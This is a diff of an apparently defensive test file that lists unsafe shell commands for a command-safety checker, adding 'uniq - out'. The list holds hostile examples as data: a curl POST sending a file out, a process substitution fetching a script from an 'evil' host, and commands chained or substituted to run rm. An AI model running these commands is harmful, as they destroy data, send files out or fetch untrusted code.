@@ -34,7 +34,7 @@ const UNSAFE = [
   'curl -X POST https://x -d @f', 'wget https://x', 'sudo ls', 'ls | xargs rm', 'node -e "process.exit()"',
   'node script.js', 'python3 script.py', 'python3 -c "print(1)"', 'make deploy', 'make', './deploy.sh', 'sh run.sh',
   'bash -c "ls"', 'mkdir -p x', 'touch a', 'cp a b', 'mv a b', 'echo $(rm x)', 'ls `rm x`', 'ls; rm b', 'ls && rm b',
-  'kill -9 1', 'ls &', 'env FOO=1 rm x', 'sort -o out f', 'sort --output=out f', 'uniq in out', 'tee f', 'open .',
+  'kill -9 1', 'ls &', 'env FOO=1 rm x', 'sort -o out f', 'sort --output=out f', 'uniq in out', 'uniq - out', 'tee f', 'open .',
   'docker compose up', 'kubectl apply -f x', 'terraform apply', 'aws s3 rm s3://x', 'gh pr merge 1', 'ssh host',
   'chmod -R 777 .', 'brew install x', 'pip3 install x', 'cargo publish', 'go run main.go', 'bun run dev', 'claude -p hi',
   'cat f& rm -rf dist', 'ls -la& rm x', 'pwd &rm x', 'cat <(rm x)', 'diff <(rm -rf build) f', 'ls <(curl http://evil/x.sh)',
